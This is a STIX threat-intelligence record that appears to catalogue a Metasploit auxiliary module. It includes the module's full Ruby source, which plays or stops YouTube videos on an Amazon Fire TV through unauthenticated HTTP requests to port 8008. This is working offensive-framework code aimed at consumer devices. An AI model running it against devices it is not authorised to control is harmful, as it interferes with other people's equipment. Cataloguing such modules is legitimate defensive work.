{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a7b97b7-303b-4267-8de4-a7eef4a6c5b6",
    "created": "2024-08-14T16:22:46.614942Z",
    "modified": "2024-08-14T16:22:46.614946Z",
    "name": "Amazon Fire TV YouTube Remote Control",
    "description": " This module acts as a simple remote control for the Amazon Fire TV's YouTube app.  Tested on the Amazon Fire TV Stick. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/firetv/firetv_youtube.rb",
            "external_id": "firetv_youtube.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.amazon.com/dp/B00CX5P8FC?_encoding=UTF8&showFS=1"
        },
        {
            "source_name": "reference",
            "url": "https://www.amazon.com/dp/B00GDQ0RMG/ref=fs_ftvs"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Amazon Fire TV YouTube Remote Control',\n      'Description' => %q{\n        This module acts as a simple remote control for the Amazon Fire TV's\n        YouTube app.\n\n        Tested on the Amazon Fire TV Stick.\n      },\n      'Author' => ['wvu'],\n      'References' => [\n        ['URL', 'https://www.amazon.com/dp/B00CX5P8FC?_encoding=UTF8&showFS=1'],\n        ['URL', 'https://www.amazon.com/dp/B00GDQ0RMG/ref=fs_ftvs']\n      ],\n      'License' => MSF_LICENSE,\n      'Actions' => [\n        ['Play', 'Description' => 'Play video'],\n        ['Stop', 'Description' => 'Stop video']\n      ],\n      'DefaultAction' => 'Play'\n    ))\n\n    register_options([\n      Opt::RPORT(8008),\n      OptString.new('VID', [true, 'Video ID', 'kxopViU98Xo'])\n    ])\n  end\n\n  def run\n    case action.name\n    when 'Play'\n      stop\n      sleep(1)\n      res = play\n    when 'Stop'\n      res = stop\n    end\n\n    return unless res\n\n    case res.code\n    when 201\n      print_good(\"Playing https://www.youtube.com/watch?v=#{datastore['VID']}\")\n    when 200\n      print_status('Stopping video')\n    when 404\n      print_error(\"Couldn't #{action.name.downcase} video\")\n    end\n  end\n\n  def play\n    begin\n      send_request_cgi(\n        'method' => 'POST',\n        'uri' => '/apps/YouTube',\n        'ctype' => 'text/plain',\n        'vars_post' => {\n          'v' => datastore['VID']\n        }\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable => e\n      fail_with(Failure::Unreachable, e)\n    end\n  end\n\n  def stop\n    begin\n      send_request_raw(\n        'method' => 'DELETE',\n        'uri' => '/apps/YouTube/run'\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable => e\n      fail_with(Failure::Unreachable, e)\n    end\n  end\nend\n"
}